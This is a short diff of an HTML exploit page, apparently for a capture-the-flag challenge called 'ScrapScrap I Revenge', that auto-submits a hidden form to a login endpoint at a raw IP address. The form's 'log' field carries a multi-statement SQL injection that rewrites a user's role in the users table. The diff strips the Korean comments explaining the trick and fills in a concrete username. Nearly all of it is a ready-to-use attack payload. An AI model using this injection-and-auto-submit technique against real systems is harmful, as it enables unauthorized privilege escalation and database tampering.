@@ -3,14 +3,9 @@
 <title>ScrapScrap I Revenge – SQLi Role Escalation</title>
 
 <form id="pwn" action="http://91.107.176.228:4000/login" method="POST" target="_top" accept-charset="UTF-8">
-  <!-- 로그인은 실패(의도) → 로그 처리 분기에서 SQL exec -->
-  <input type="hidden" name="username" value="YOUR_USER">
+  <input type="hidden" name="username" value="test2">
   <input type="hidden" name="password" value="definitely-wrong-password">
-  <!-- 핵심: 멀티-스테이트먼트 SQLi (뒤 공백 중요) -->
-  <input type="hidden" name="log" value="x'); UPDATE users SET role='user' WHERE username='YOUR_USER';-- ">
+  <input type="hidden" name="log" value="x'); UPDATE users SET role='user' WHERE username='test2';-- ">
 </form>
 
-<script>
-  // 탑-레벨 네비게이션 POST (쿠키는 안 붙어도 상관없음)
-  document.getElementById('pwn').submit();
-</script>
+<script>document.getElementById('pwn').submit();</script>
